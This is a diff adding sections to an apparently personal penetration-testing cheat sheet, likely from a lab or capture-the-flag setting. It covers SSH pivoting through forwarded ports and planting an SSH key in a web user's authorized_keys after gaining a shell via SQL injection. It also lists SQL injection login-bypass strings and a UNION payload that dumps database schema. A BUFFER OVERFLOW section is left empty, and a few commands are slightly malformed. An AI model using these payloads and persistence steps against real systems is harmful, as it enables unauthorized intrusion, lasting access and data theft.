@@ -18,3 +18,32 @@ ssh -O forward -S /tmp/gray -D 9050 placeholder
 ssh -O cancel -S /tmp/gray -D 9050 placeholder
 ssh -O forward -S /tmp/gray -L 50801:192.168.28.111:80 dummy
 ssh -i id_rsa www-data@10.50.26.109
+
+## SSH KEY-GEN ##
+IF YOU GET ACCESS TO A TERMINAL VIA SQL INJECTION USE THIS >
+ ssh-keygen -t rsa
+; mkdir /var/www/html/.ssh/authorized_keys
+;echo "" > /var/www/.ssh/authorized_keys (MAKE THE .SSH FOLDER YOU DOOF)
+ssh -i id_rsa www-data@10.50.26.109
+
+## PYTHON SERVER ##
+python3 -M http.server
+
+## SQL INJECTION ## 
+JOE' OR 1=1 ###
+JOE' OR 1='1
+' OR 1='1
+audi' UNION select 1,2,3,4,5#
+
+THIS IS THE GOLDEN STATEMENT >
+Audi'UNION select table_schema,table_name,column_name from information_schema.columns#
+
+## BUFFER OVERFLOW ##
+
+
+
+
+
+
+
+
